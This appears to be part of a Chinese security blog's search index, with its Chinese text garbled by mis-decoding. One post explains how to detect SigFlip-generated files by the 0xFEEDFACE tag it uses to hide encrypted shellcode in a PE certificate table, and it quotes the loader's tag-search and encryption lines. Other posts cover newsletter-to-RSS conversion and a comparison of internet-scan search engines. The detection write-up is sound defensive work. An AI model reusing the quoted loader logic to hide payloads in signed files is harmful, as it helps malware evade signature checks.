_DT_SecEntry_Offset = -2; } } ... //Get IMAGE_DIRECTORY_ENTRY_SECURITY field and retrieve the RVA and SIZE of the Certificate Table (WIN_CERTIFICATE). _CertTableRVA = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].VirtualAddress; _CertTableSize = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size; ä½†æ˜¯å®é™…ä¸Šçœ‹åˆ°çš„åŸºæœ¬éƒ½æ˜¯ IMAGE_DIRECTORY_ENTRY_SECURITY åœ¨ç¬¬äº”ä¸ªï¼Œè€Œæ²¡æœ‰ä»–è¿™é‡Œçš„æƒ…å†µï¼Œå¹¶ä¸”å°±ç®—æ˜¯æœ‰è¿™ç§æƒ…å†µï¼Œæ³¨é‡Šå’Œä»£ç å†™å¾—ä¹Ÿä¸ç›¸ç¬¦ã€‚\næœ€åä¸€å¥ï¼ŒNativeè·‘ä¸èµ·æ¥ï¼ŒDotNetçš„å®ç°æ˜¯æ­£ç¡®çš„\næœ€åçš„ yara è§„åˆ™å¤§å®¶å¯ä»¥è‡ªå·±ç ”ç©¶ä¸‹\n","permalink":"https://www.hacktech.cn/post/identify-sigflip-file.html","summary":"\u003cp\u003eæœ€è¿‘åœ¨ç§»æ¤ \u003ca href=\"https://github.com/med0x2e/SigFlip\"\u003emed0x2e/SigFlip\u003c/a\u003e çš„è¿‡ç¨‹ä¸­å‘ç°äº†ä¸€ä¸ªæœ‰æ„æ€çš„ç‚¹ï¼Œå¯ä»¥ç”¨æ¥ä½œä¸ºæ£€æµ‹çš„æ‰‹æ®µ\u003c/p\u003e\n\u003cp\u003eåœ¨ SigFlip é¡¹ç›®çš„ \u003ca href=\"https://github.com/med0x2e/SigFlip#detectprevent\"\u003eDetect/Prevent\u003c/a\u003e ä¸€èŠ‚ä¸­ä½œè€…æœ‰æåˆ°ä¸€äº›æ£€æµ‹é˜²å¾¡æ‰‹æ®µ\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://docs.microsoft.com/en-us/security-updates/SecurityAdvisories/2014/2915720?redirectedfrom=MSDN\"\u003ehttps://docs.microsoft.com/en-us/security-updates/SecurityAdvisories/2014/2915720?redirectedfrom=MSDN\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003eOnce the patch is installed and proper registry keys are set, No system restarts are required, you only need to restart the Cryptographic Services. The Applocker service will be also restarted as it depends on the cryptographic services.(@p0w3rsh3ll)\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003eYara rule by Adrien;Â \u003ca href=\"https://twitter.com/Int2e_/status/1330975808941330432\"\u003ehttps://twitter.com/Int2e_/status/1330975808941330432\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eä» SigFlip æºç ä¸­ï¼Œå…¶å®ä¹Ÿèƒ½å‘ç°ä¸€ä¸ªç‚¹\u003c/p\u003e\n\u003cp\u003eSigFlip ä¾èµ–ä¸€ä¸²ç‰¹å®šçš„å­—èŠ‚æ¥å®šä½shellcodeçš„ä½ç½®ï¼Œè¯¦è§ \u003ca href=\"https://github.com/med0x2e/SigFlip/blob/e24a1fcde8ab27f58c35935f65078b47b20eca43/Native/SigLoader/SigLoader/SigLoader.cpp#L102\"\u003eNative/SigLoader/SigLoader/SigLoader.cpp#L102\u003c/a\u003e å’Œ \u003ca href=\"https://github.com/med0x2e/SigFlip/blob/e24a1fcde8ab27f58c35935f65078b47b20eca43/Native/SigFlip/SigFlip/SigFlip.cpp#L232\"\u003eNative/SigFlip/SigFlip/SigFlip.cpp#L232\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e3\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e4\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e5\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e6\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e7\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e (_index \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e; _index \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e _CertTableSize; _index\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e(_pePtr \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e _index) \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0xfe\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e(_pePtr \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e _index \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0xed\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e(_pePtr \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e _index \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0xfa\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e(_pePtr \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e _index \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0xce\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[*]: Tag Found 0x%x%x%x%x\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e(_pePtr \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e _index), \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e(_pePtr \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e _index\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e), \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e(_pePtr \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e _index\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e), \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e(_pePtr \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e _index\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t_dataOffset \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e _index \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ememcpy\u003c/span\u003e(_encryptedData, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\xFE\\xED\\xFA\\xCE\\xFE\\xED\\xFA\\xCE\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ecrypt\u003c/span\u003e((\u003cspan style=\"color:#66d9ef\"\u003eunsigned\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e)_data, _dataSize, _key, _keySize, (\u003cspan style=\"color:#66d9ef\"\u003eunsigned\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e)_encryptedData \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åœ¨è¯ä¹¦è¡¨ä¸­å®šä½åˆ° \u003ccode\u003e\\xFE\\xED\\xFA\\xCE\\xFE\\xED\\xFA\\xCE\u003c/code\u003e è¿™æ®µç‰¹å¾å°±å¯ä»¥æ–­å®šå®ƒç–‘ä¼¼ SigFlip ç”Ÿæˆçš„ payload äº†ï¼Œæƒ³è¦æ›´ç²¾å‡†ä¸€äº›å¯ä»¥ç»“åˆ \u003ca href=\"https://twitter.com/Int2e_/status/1330975808941330432\"\u003ehttps://twitter.com/Int2e_/status/1330975808941330432\u003c/a\u003e ä¸­æåˆ°çš„é•¿åº¦ç‰¹å¾ã€‚\u003c/p\u003e","title":"è¯†åˆ«SigFlipç”Ÿæˆçš„æ¶æ„æ–‡ä»¶"},{"content":"ç›¸å…³çš„å¼€æºé¡¹ç›® https://github.com/leafac/kill-the-newsletter\nä½œè€…æä¾›äº†ä¸€ä¸ªç½‘ç«™ https://kill-the-newsletter.com/ æ¥æä¾›æœåŠ¡ï¼Œæˆªè‡³20211119ï¼Œè‡³å°‘å·²ç»æä¾›äº†ä¸¤å¹´çš„æœåŠ¡äº†ï¼Œæ‰€ä»¥ç¨³å®šæ€§è¿˜å¯\nä¸‹é¢å°±æ˜¯ä½¿ç”¨æ–¹æ³•äº†\né€‰æ‹©ä¸€ä¸ªä½ è¦è®¢é˜…çš„newsletterï¼Œæ¯”å¦‚ https://random-lab.ghost.io/\næ‰“å¼€ https://kill-the-newsletter.com/ ï¼Œè¾“å…¥ä½ è¦ç»™è¯¥è®¢é˜…å–çš„åå­—ï¼Œæ¯”å¦‚æˆ‘è¾“å…¥ 1000å°é£ŸæŠ¥ ï¼Œç„¶åç‚¹å‡» create inbox\nç„¶åä¼šæä¾›ç»™ä½ ä¸€ä¸ªé‚®ç®±å’Œä¸€ä¸ªrssè®¢é˜…åœ°å€\nå°†é‚®ç®±åœ°å€å¡«å…¥ç¬¬ä¸€æ­¥ä¸­çš„è®¢é˜…é‚®ç®±\nå°†rssè®¢é˜…åœ°å€åŠ åˆ°ä½ çš„rssé˜…è¯»å™¨\nä¸€èˆ¬æƒ…å†µä¸‹ä½ ä¼šæ”¶åˆ°çš„ç¬¬ä¸€ä¸ªè®¢é˜…æ¶ˆæ¯æ˜¯å«ä½ ç¡®è®¤è®¢é˜…ï¼Œç‚¹å‡»ç¡®è®¤åœ°å€å³å¯\nä¸‹é¢è¯´ä¸‹åŸç†ï¼š\né¦–å…ˆéœ€è¦æœ‰ä¸ªé‚®æœï¼Œç„¶åæ¯æ¬¡åˆ›å»ºinboxçš„æ—¶å€™éšæœºç”Ÿæˆä¸€ä¸ªé‚®ç®±ï¼Œå¹¶ä¸”å°†æ­¤é‚®ç®±çš„æ”¶ä»¶ç®±å†…å®¹è½¬ä¸ºrssè®¢é˜…æš´éœ²å‡ºæ¥\n","permalink":"https://www.hacktech.cn/post/newsletter2rss.html","summary":"\u003cp\u003eç›¸å…³çš„å¼€æºé¡¹ç›® \u003ca href=\"https://github.com/leafac/kill-the-newsletter\"\u003ehttps://github.com/leafac/kill-the-newsletter\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eä½œè€…æä¾›äº†ä¸€ä¸ªç½‘ç«™ \u003ca href=\"https://kill-the-newsletter.com/\"\u003ehttps://kill-the-newsletter.com/\u003c/a\u003e æ¥æä¾›æœåŠ¡ï¼Œæˆªè‡³20211119ï¼Œè‡³å°‘å·²ç»æä¾›äº†ä¸¤å¹´çš„æœåŠ¡äº†ï¼Œæ‰€ä»¥ç¨³å®šæ€§è¿˜å¯\u003c/p\u003e\n\u003cp\u003eä¸‹é¢å°±æ˜¯ä½¿ç”¨æ–¹æ³•äº†\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eé€‰æ‹©ä¸€ä¸ªä½ è¦è®¢é˜…çš„newsletterï¼Œæ¯”å¦‚ \u003ca href=\"https://random-lab.ghost.io/\"\u003ehttps://random-lab.ghost.io/\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eæ‰“å¼€ \u003ca href=\"https://kill-the-newsletter.com/\"\u003ehttps://kill-the-newsletter.com/\u003c/a\u003e ï¼Œè¾“å…¥ä½ è¦ç»™è¯¥è®¢é˜…å–çš„åå­—ï¼Œæ¯”å¦‚æˆ‘è¾“å…¥ \u003ccode\u003e1000å°é£ŸæŠ¥\u003c/code\u003e ï¼Œç„¶åç‚¹å‡» \u003ccode\u003ecreate inbox\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eç„¶åä¼šæä¾›ç»™ä½ ä¸€ä¸ªé‚®ç®±å’Œä¸€ä¸ªrssè®¢é˜…åœ°å€\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eå°†é‚®ç®±åœ°å€å¡«å…¥ç¬¬ä¸€æ­¥ä¸­çš„è®¢é˜…é‚®ç®±\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eå°†rssè®¢é˜…åœ°å€åŠ åˆ°ä½ çš„rssé˜…è¯»å™¨\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eä¸€èˆ¬æƒ…å†µä¸‹ä½ ä¼šæ”¶åˆ°çš„ç¬¬ä¸€ä¸ªè®¢é˜…æ¶ˆæ¯æ˜¯å«ä½ ç¡®è®¤è®¢é˜…ï¼Œç‚¹å‡»ç¡®è®¤åœ°å€å³å¯\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://raw.githubusercontent.com/akkuman/pic/master/notionimg/7d/d6/7dd60ab74cab5a242a2452de7283627f.png\" alt=\"\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eä¸‹é¢è¯´ä¸‹åŸç†ï¼š\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆéœ€è¦æœ‰ä¸ªé‚®æœï¼Œç„¶åæ¯æ¬¡åˆ›å»ºinboxçš„æ—¶å€™éšæœºç”Ÿæˆä¸€ä¸ªé‚®ç®±ï¼Œå¹¶ä¸”å°†æ­¤é‚®ç®±çš„æ”¶ä»¶ç®±å†…å®¹è½¬ä¸ºrssè®¢é˜…æš´éœ²å‡ºæ¥\u003c/p\u003e","title":"å°†newsletterè½¬ä¸ºrss"},{"content":"æœ€è¿‘ç½‘ç»œç©ºé—´æ£€ç´¢å¹³å°é›¨åæ˜¥ç¬‹èˆ¬æ¶Œç°ï¼Œæœ¬ç¯‡æ–‡ç« ä»¥ä¸€ä¸ªä½¿ç”¨è€…çš„è§†è§’æ¥åšä¸€ä¸‹å¯¹æ¯”\nè¯­æ³• ç›®å‰ç½‘ç»œä¸Šæ¯”è¾ƒçŸ¥åçš„ç½‘ç»œç©ºé—´æ£€ç´¢å¹³å°æœ‰ç™½å¸½æ±‡çš„ fofaã€360çš„ quakeã€çŸ¥é“åˆ›å®‡çš„ zoomeyeã€å®‰æ’çš„ sumapã€å¥‡å®‰ä¿¡çš„ hunterã€ä»¥åŠå›½å¤–çš„ shodan\nç®€å•å¯¹æ¯”ä¸‹è¯­æ³•ä¸Šçš„å·®å¼‚ï¼Œå½“ç„¶ï¼Œä¸ä¸€å®šå‡†ç¡®ï¼Œä¹Ÿä¸ä¸€å®šå°±æ˜¯æˆ‘ä¸‹é¢åˆ—å‡ºçš„å­—æ®µåç§°ï¼Œå„å®¶å¯¹äºå­—æ®µåç§°å¯èƒ½æœ‰äº›å·®å¼‚\nå…¬å…± é¦–å…ˆæ˜¯å¤§å®¶éƒ½å…±æœ‰çš„å­—æ®µæœç´¢ï¼Œ\nå­—æ®µåç§° å­—æ®µè¯´æ˜ title ç½‘ç«™æ ‡é¢˜ body æ­£æ–‡ï¼Œæˆ–è€…è¯´å“åº”ä½“ cert è¯ä¹¦å†…å®¹ ip ipæˆ–ipæ®µ port ç«¯å£ protocol åè®® server http headersé‡Œé¢çš„Serverå­—æ®µ base_protocol ä¼ è¾“å±‚åè®® os ç³»ç»Ÿ asn è‡ªæ²»åŸŸå·ç  status_code webçŠ¶æ€ç  icon_hash å›¾æ ‡hash region åœ°åŒº app åº”ç”¨æŒ‡çº¹ æ—¶é—´ shodan å¹¶æ²¡æœ‰é’ˆå¯¹é‡‡é›†æ—¶é—´çš„ before å’Œ after è¯­æ³•ï¼Œå›½å†…å„å®¶è²Œä¼¼éƒ½æœ‰é’ˆå¯¹é‡‡é›†æ—¶é—´çš„æŸ¥è¯¢\nåŸŸå shodan å¹¶æ²¡æœ‰é’ˆå¯¹ipå…³è”çš„åŸŸååšè¯­æ³•ï¼Œå›½å†…å„å®¶è²Œä¼¼éƒ½æœ‰é’ˆå¯¹åŸŸåçš„æŸ¥è¯¢\nipv6 æ ¹æ®å‡ å®¶çš„è¯´æ˜æ–‡æ¡£æ¥çœ‹ï¼Œé™¤äº†hunterï¼Œå…¶ä»–å®¶éƒ½æœ‰æä¾›ipv6çš„èµ„äº§æŸ¥è¯¢ï¼Œä¸è¿‡ç°é˜¶æ®µç”¨å¾—è¾ƒå°‘\nhostname é™¤äº† sumap å’Œ hunterï¼Œå…¶ä»–å®¶éƒ½æœ‰æä¾›å¯¹äºrDNSçš„æŸ¥è¯¢ï¼ˆå³hostnameå­—æ®µï¼‰ï¼Œä¸è¿‡è¯¥åŠŸèƒ½ä¹Ÿç”¨å¾—å°‘\nè¯ä¹¦ç»†åŒ– è¯ä¹¦å†…å®¹å…¶å®å°±æ˜¯ä¸€ä¸ªæ–‡æœ¬å†…å®¹ï¼Œå„å®¶åœ¨é’ˆå¯¹è¿™ä¸ªæ–‡æœ¬çš„è§£æä¸Šæœ‰å¤šæœ‰å°‘ï¼Œç›®å‰çœ‹èµ·æ¥åœ¨è¿™ä¸€å—shadonå’Œquakeæ˜¯åšå¾—æœ€ç»†è‡´çš„\nfofa quake shodan zoomeye sumap hunter å¤§å®¶è¦æ˜¯æƒ³è‡ªå·±åœ¨å‘½ä»¤è¡Œè§£ææ¨èä¸€ä¸ªå·¥å…· cfssl-certinfoï¼Œå¤§æ¦‚å¯ä»¥è§£æå‡ºçš„å†…å®¹å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 cfssl-certinfo -cert kubernetes.pem { \u0026#34;subject\u0026#34;: { \u0026#34;common_name\u0026#34;: \u0026#34;kubernetes\u0026#34;, \u0026#34;country\u0026#34;: \u0026#34;CN\u0026#34;, \u0026#34;organization\u0026#34;: \u0026#34;k8s\u0026#34;, \u0026#34;organizational_unit\u0026#34;: \u0026#34;System\u0026#34;, \u0026#34;locality\u0026#34;: \u0026#34;BeiJing\u0026#34;, \u0026#34;province\u0026#34;: \u0026#34;BeiJing\u0026#34;, \u0026#34;names\u0026#34;: [ \u0026#34;CN\u0026#34;, \u0026#34;BeiJing\u0026#34;, \u0026#34;BeiJing\u0026#34;, \u0026#34;k8s\u0026#34;, \u0026#34;System\u0026#34;, \u0026#34;kubernetes\u0026#34; ] }, \u0026#34;issuer\u0026#34;: { \u0026#34;common_name\u0026#34;: \u0026#34;kubernetes\u0026#34;, \u0026#34;country\u0026#34;: \u0026#34;CN\u0026#34;, \u0026#34;organization\u0026#34;: \u0026#34;k8s\u0026#34;, \u0026#34;organizational_unit\u0026#34;: \u0026#34;System\u0026#34;, \u0026#34;locality\u0026#34;: \u0026#34;BeiJing\u0026#34;, \u0026#34;province\u0026#34;: \u0026#34;BeiJing\u0026#34;, \u0026#34;names\u0026#34;: [ \u0026#34;CN\u0026#34;, \u0026#34;BeiJing\u0026#34;, \u0026#34;BeiJing\u0026#34;, \u0026#34;k8s\u0026#34;, \u0026#34;System\u0026#34;, \u0026#34;kubernetes\u0026#34; ] }, \u0026#34;serial_number\u0026#34;: \u0026#34;243750511260095960201836502027625859126538784827\u0026#34;, \u0026#34;sans\u0026#34;: [ \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;kubernetes\u0026#34;, \u0026#34;kubernetes.default\u0026#34;, \u0026#34;kubernetes.default.svc\u0026#34;, \u0026#34;kubernetes.default.svc.cluster\u0026#34;, \u0026#34;kubernetes.default.svc.cluster.local\u0026#34;, \u0026#34;127.0.0.1\u0026#34; ], \u0026#34;not_before\u0026#34;: \u0026#34;2017-12-23T10:27:00Z\u0026#34;, \u0026#34;not_after\u0026#34;: \u0026#34;2018-12-23T10:27:00Z\u0026#34;, \u0026#34;sigalg\u0026#34;: \u0026#34;SHA256WithRSA\u0026#34;, \u0026#34;authority_key_id\u0026#34;: \u0026#34;6E:45:FB:5F:1F:73:87:3E:C3:C:54:AB:74:95:2A:FB:44:E0:9B:D8\u0026#34;, \u0026#34;subject_key_id\u0026#34;: \u0026#34;62:EA:5A:DC:13:C4:5F:D5:EC:DB:13:77:DA:E1:90:1F:C9:4B:10:14\u0026#34;, \u0026#34;pem\u0026#34;: \u0026#34;-----BEGIN CERTIFICATE-----\\nMIIEcTCCA1mgAwIBAgIUKrImpH2fsSHYOsDcp3FzPmYT0DswDQYJKoZIhvcNAQEL\\nBQAwZTELMAkGA1UEBhMCQ04xEDAOBgNVBAgTB0JlaUppbmcxEDAOBgNVBAcTB0Jl\\naUppbmcxDDAKBgNVBAoTA2s4czEPMA0GA1UECxMGU3lzdGVtMRMwEQYDVQQDEwpr\\ndWJlcm5ldGVzMB4XDTE3MTIyMzEwMjcwMFoXDTE4MTIyMzEwMjcwMFowZTELMAkG\\nA1UEBhMCQ04xEDAOBgNVBAgTB0JlaUppbmcxEDAOBgNVBAcTB0JlaUppbmcxDDAK\\nBgNVBAoTA2s4czEPMA0GA1UECxMGU3lzdGVtMRMwEQYDVQQDEwprdWJlcm5ldGVz\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAp9OWY14XEX7WtXMVKqrq\\naWdIw/EQgwNNmQmI7LcnEmggK5XTv84/mhzEiDGtz9LZ0Xw5IPVP2emPKOJE0N9p\\nKRAV2sMS1U7FJKOIuasKk2sa5QstWhNPjDdS+jNSvaFvT3MAWg50LfD6/wWAnSiV\\n4r9kA9ff+d8QhgavZvSX19KCkerP0Yjjn2ujD6kNtHOanFcA8i74UF8oM3qHOo1T\\nFglHx+ZD0D6BV5aCQdTyWo9QwBExPC6AGbUydAIewxwCefPz0IalPXvZo9AS05dt\\nEX6cTvP+hC3RQxBfp0EVHD/UPV/n+YDspx0/oYexMrFn2MFVkTXLp64QUc0Z7MQe\\nGwIDAQABo4IBFzCCARMwDgYDVR0PAQH/BAQDAgWgMB0GA1UdJQQWMBQGCCsGAQUF\\nBwMBBggrBgEFBQcDAjAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBRi6lrcE8Rf1ezb\\nE3fa4ZAfyUsQFDAfBgNVHSMEGDAWgBRuRftfH3OHPsMMVKt0lSr7ROCb2DCBkwYD\\nVR0RBIGLMIGIggCCAIIKa3ViZXJuZXRlc4ISa3ViZXJuZXRlcy5kZWZhdWx0ghZr\\ndWJlcm5ldGVzLmRlZmF1bHQuc3Zjgh5rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNs\\ndXN0ZXKCJGt1YmVybmV0ZXMuZGVmYXVsdC5zdmMuY2x1c3Rlci5sb2NhbIcEfwAA\\nATANBgkqhkiG9w0BAQsFAAOCAQEALL0sJDq2dGGN8leHcUc2+Sgy9MIQPzXSNhug\\nPJaamIpZBwAvP6yD/fEACapNciY4iMleoy/f8L98BzlVHTDchxV8TwGfX3TgeAlq\\n8C6/qagmhgFDi0mjv3cnoLp3mj3mFE47UuQ1L4uIZEztbZfPjCGdpRyA/4Dw1RjQ\\nDB41hGBVTQ4sbFbTNtQMYz5lxD23I7UuXyBeQ2WFLYdMtuld01iQ1vu0Hh0jYvie\\nYyKtlbrpnvOIFvTx2qLB78Qv0427QjxjjyC5bJqQZS42T7X4ynXiaQ8OB5mMAVP/\\nzKCnlTMlt+d4M7wv+CU6/klPVQasF8D52Ykvu8mPEHshelk/CA==\\n-----END CERTIFICATE-----\\n\u0026#34; } æ¼æ´ 